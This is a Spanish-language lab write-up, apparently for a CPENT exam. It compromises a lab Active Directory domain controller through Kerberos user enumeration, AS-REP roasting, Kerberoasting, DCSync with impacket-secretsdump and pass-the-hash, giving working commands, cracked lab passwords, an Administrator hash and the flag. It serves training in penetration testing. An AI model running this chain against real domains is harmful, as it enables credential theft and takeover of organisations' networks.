# ORTHRUS — Bitácora del análisis

**Objetivo:** `172.16.202.130` (máquina virtual OVA — controlador de dominio Windows Server 2019)
**Atacante:** Kali Linux (`172.16.202.129`) — **Dificultad:** Media ★★★☆☆☆☆☆ (3 puntos) — **Categoría:** Pivoting & Lateral Movement — **Dominio:** `corp.local` — **Hostname del DC:** `WIN-CFIU5AU7L2D` — 
**Bandera:** `C:\Users\Administrator\Desktop\FLAG_DOMAIN_ADMIN.txt` **Fecha:** 19/10/2026

---

## 1. Reconocimiento

### 1.1 Descubrimiento del host

Kali está en `172.16.202.129/24` y el laboratorio es una OVA en la misma red, así que el punto de
partida fue un barrido ARP del segmento (`nmap -sn -PR 172.16.202.0/24`). Aparece un solo host nuevo:

```
172.16.202.130   MAC 00:0C:29:2B:B1:46 (VMware)
```

El resto de respuestas son infraestructura: `172.16.202.1` (filtra todos los puertos), `.2` y `.254`
(puerta de enlace y servicios del hipervisor). No hubo que buscar más: el objetivo estaba claro.

### 1.2 Superficie

Escaneo completo: **21 puertos abiertos** de 65 535, todos de la pila de Active Directory:

```
53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389 + RPC dinámico
```

El escaneo de versiones identifica el rol al primer intento:

```
389/tcp  ldap  Microsoft Windows Active Directory LDAP (Domain: corp.local, ...)
Service Info: Host: WIN-CFIU5AU7L2D; OS: Windows
```

- Windows Server 2019 Standard Evaluation (build 17763).
- SMB con firma obligatoria: **el relay NTLM queda descartado de entrada**.
- Sin HTTP de aplicación (el 5985 es WinRM), sin SSH, sin FTP.
- DNS con un único registro: el propio DC. `intranet` y `db01` **no resuelven**.

### 1.3 Enumeración anónima: lo que no funcionó

| Vector | Resultado |
|---|---|
| `smbclient -L` sesión nula | «Anonymous login successful» pero cero recursos |
| `crackmapexec --shares` | `STATUS_ACCESS_DENIED` |
| `rpcclient` anónimo | `NT_STATUS_ACCESS_DENIED` |
| `ldapsearch` anónimo | El rootDSE responde; las consultas exigen bind |
| `dig AXFR` | `Transfer failed` |
| `enum4linux -a` | Dominio `CORP` y SID; ningún usuario |

Dos lecturas que conviene no confundir:

- **«Anonymous login successful» no es acceso.** SMB acepta la sesión nula pero no lista nada. El
  mensaje invita a creer que hay un pie; no lo hay.
- **RootDSE público no es LDAP anónimo.** El DC publica su raíz, pero cualquier búsqueda de objetos
  falla con `a successful bind must be completed on the connection`.

Con LDAP, RPC y DNS cerrados, la enumeración de usuarios tenía que salir de **Kerberos**.

---

## 2. El pivoting que no era de red

La categoría del laboratorio es *pivoting* y los SPN de `svc_sql` apuntan a `intranet.corp.local` y
`db01.corp.local`, lo que sugiere una red interna detrás del DC. Antes de aceptarlo como hipótesis,
lo verifiqué por cuatro vías independientes:

| Comprobación | Resultado |
|---|---|
| Barrido ARP de `172.16.202.0/24` | Solo el DC; ningún host adicional |
| Zona DNS (nodos `dnsNode` por LDAP) | Único registro: `win-cfiu5au7l2d` |
| Objetos de equipo (`objectClass=computer`) | Un único equipo: el propio DC |
| `ipconfig` en el DC (vía credenciales) | Una sola interfaz, `172.16.202.130/24` |

Conclusión: **no hay red interna ni segundo host**. Los SPN `intranet`/`db01` son señuelos. El
*pivoting* del laboratorio es **de cuentas y privilegios**: `svc_backup` → `svc_sql` → `Administrator`.

---

## 3. Enumeración de usuarios: el falso positivo que corregí

Kerberos permite preguntar al KDC si una cuenta de usuario existe sin enviar contraseñas: un `AS-REQ` sin
preautenticación devuelve un `KRB-ERROR` cuyo código distingue «existe» (25), «deshabilitado» (18) y
«no existe» (6). Escribí `exploits/krbenum.py` para automatizarlo sobre una lista de candidatos.

**El error:** la primera versión asumía que `impacket` lanzaba una excepción ante un `KRB-ERROR`. No lo
hace: `sendReceive()` devuelve el `KRB-ERROR` como bytes y el script lo interpretaba como un AS-REP
válido. Resultado: `administrator` aparecía como `ASREP_SIN_PREAUTH`, cuando en realidad solo pide
preautenticación. Un falso positivo de una línea de código.

**La corrección:** decodificar la respuesta con `decoder.decode(raw, asn1Spec=KRB_ERROR())` y leer el
campo `error-code`; solo si la decodificación falla se trata como AS-REP real.

```
  [+] administrator                EXISTE (25)
  [+] guest                        EXISTE (18)
  [+] krbtgt                       EXISTE (18)
  [+] svc_backup                   ASREP_SIN_PREAUTH
  [+] svc_sql                      EXISTE (25)

=== 5 existentes de 144 probados ===
```

De 144 candidatos (nombres comunes, hispanos, temática griega, cuentas de servicio y formatos
`nombre.apellido`), solo existen 5. El patrón del laboratorio son las **cuentas de servicio**; no hizo
falta ampliar la lista.

### 3.1 La misma enumeración con herramientas nativas

`krbenum.py` es un atajo, no un requisito. El script `krb5-enum-users` de `nmap` (incluido en Kali)
responde a la misma pregunta con la misma lista:

```bash
nmap -Pn -p 88 --script krb5-enum-users \
  --script-args krb5-enum-users.realm=corp.local,userdb=wordlists/users_corp.txt \
  172.16.202.130
```

```
| krb5-enum-users:
| Discovered Kerberos principals
|     svc_backup@corp.local
|     svc_sql@corp.local
|_    administrator@corp.local
```

Devuelve las 3 cuentas relevantes en menos de un segundo (no lista las deshabilitadas: `guest` y
`krbtgt`). El resto de la cadena ya usaba herramientas preinstaladas, así que `exploits/chain_kali.sh`
la reproduce entera sin nada propio.

---

## 4. AS-REP roasting: `svc_backup`

`svc_backup` tiene `UF_DONT_REQUIRE_PREAUTH`: su AS-REP se entrega sin autenticación y se puede atacar
offline. Con `impacket-GetNPUsers` y `john`:

```bash
impacket-GetNPUsers corp.local/ -no-pass -usersfile wordlists/users_corp.txt \
  -dc-ip 172.16.202.130 -format hashcat
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt loot/asrep_hash.txt
```

```
Password123      ($krb5asrep$23$svc_backup@CORP.LOCAL)
```

El hash es etype 23 (RC4), el más rápido de crackear. **`svc_backup:Password123`**.

> **Nota operativa:** `hashcat` falló con `Not enough allocatable device memory` en la VM. `john`
> resolvió el hash en menos de un segundo, así que no mereció la pena ajustar hashcat.

---

## 5. Kerberoasting: `svc_sql`

Con `svc_backup` se piden TGS para los SPN del bosque:

```bash
impacket-GetUserSPNs corp.local/svc_backup:Password123 -dc-ip 172.16.202.130 -request
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt loot/tgs_hash.txt
```

La tabla de `GetUserSPNs` da dos datos:

1. `svc_sql` tiene tres SPN (`HTTP/intranet`, `MSSQLSvc/db01`, `MSSQLSvc/db01:1433`).
2. **`svc_sql` pertenece a `CN=Administrators,CN=Builtin,DC=corp,DC=local`** — es administrador local
   del DC.

El TGS cae con la misma contraseña: **`svc_sql:Password123`**.

Dos cuentas de servicio distintas con la misma contraseña débil: ese es el eslabón que convierte una
cuenta de respaldos sin privilegios en control administrativo del DC.

También se enumeró la política del dominio con `svc_backup`:

- Contraseña mínima: 7 caracteres; complejidad activada.
- **Sin umbral de bloqueo** (`Account Lockout Threshold: None`).
- Shares: solo los por defecto; en `SYSVOL` no hay scripts con credenciales.

El escenario se podría haber atacado también con *password spraying* (no hay bloqueo), pero el
AS-REP y el Kerberoasting dieron credenciales sin tocar la autenticación.

---

## 6. Compromiso de dominio

```
[+] corp.local\svc_sql:Password123 (Pwn3d!)
```

SMB y WinRM confirman permisos administrativos en el DC. El grupo integrado `Administrators` tiene por
defecto el derecho **Replicating Directory Changes**, que es el que habilita DCSync:

```bash
impacket-secretsdump corp.local/svc_sql:Password123@172.16.202.130 -just-dc-user Administrator
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88e1db77ee01e9e14dfc4dac2617f266:::
```

Pass-the-hash con el hash de `Administrator` (`88e1db77ee01e9e14dfc4dac2617f266`) y lectura de la
bandera en `C:\Users\Administrator\Desktop\FLAG_DOMAIN_ADMIN.txt`:

```
CPENT{k3rb3r05_r045t_d0m41n_4dm1n_2026}

[+] DOMAIN COMPROMISE VERIFIED - EXAMEN CPENT EC-COUNCIL
[+] Modulo 09: Active Directory Penetration Testing
[+] Instructor: Hector Camacho / Academia Edutek
```

> **Nota de herramienta:** `impacket-wmiexec` con varias órdenes separadas por `&` trunca la salida;
> conviene enviar una sola orden por ejecución. `smbclient ls <ruta>` tampoco lista la ruta indicada:
> hay que entrar con `-D <ruta>` y listar desde dentro.

---

## 7. Progreso

- [x] Descubrimiento del host en la red local (ARP)
- [x] Escaneo completo: 21 puertos, todos de AD
- [x] Identificación del dominio (`corp.local`) y del DC (`WIN-CFIU5AU7L2D`)
- [x] Enumeración anónima descartada (SMB, LDAP, RPC, DNS)
- [x] Enumerador Kerberos corregido tras el falso positivo
- [x] 144 candidatos → 5 cuentas reales
- [x] AS-REP roasting de `svc_backup` → `Password123`
- [x] Kerberoasting de `svc_sql` → `Password123` y `BUILTIN\Administrators`
- [x] Comprobado que no hay red interna (los SPN `intranet`/`db01` son señuelos)
- [x] `svc_sql` confirmado como administrador local del DC (`Pwn3d!`)
- [x] DCSync del hash de `Administrator`
- [x] Pass-the-hash y lectura de la bandera
- [x] Cadena reproducida solo con herramientas de Kali (`chain_kali.sh`)

```
CPENT{k3rb3r05_r045t_d0m41n_4dm1n_2026}
```

---

## 8. Ideas descartadas sobre la marcha

| Hipótesis | Por qué se descartó |
|---|---|
| Hay una red interna detrás del DC (pivoting de red) | Sin hosts en ARP, sin registros DNS ni objetos de equipo; el DC tiene una sola interfaz |
| `intranet` / `db01` son máquinas reales | No resuelven y no existen como objetos de equipo |
| Zerologon (CVE-2020-1472) | Innecesario y destructivo: resetea la contraseña de la cuenta de máquina del DC; la vía Kerberos era limpia |
| NoPac / PrintNightmare | Requieren credenciales previas; el AS-REP ya dio una cuenta |
| Relay NTLM | SMB exige firma (`Message signing enabled and required`) |
| Enumeración de usuarios por LDAP o RPC anónimos | Bloqueada; el *rootDSE* no basta |
| Transferencia de zona DNS | `Transfer failed` |
| Password spraying contra las cuentas del dominio | No hizo falta: el AS-REP se rompe offline y no toca la autenticación |
| Credenciales en `SYSVOL`/`NETLOGON` | No hay scripts; solo las políticas por defecto |
| Explotar MSSQL en `db01` | El host no existe |
| Cuenta `guest` | Deshabilitada (código Kerberos 18) |
| `hashcat` para los hashes | Sin memoria asignable en la VM; `john` los resolvió al instante |
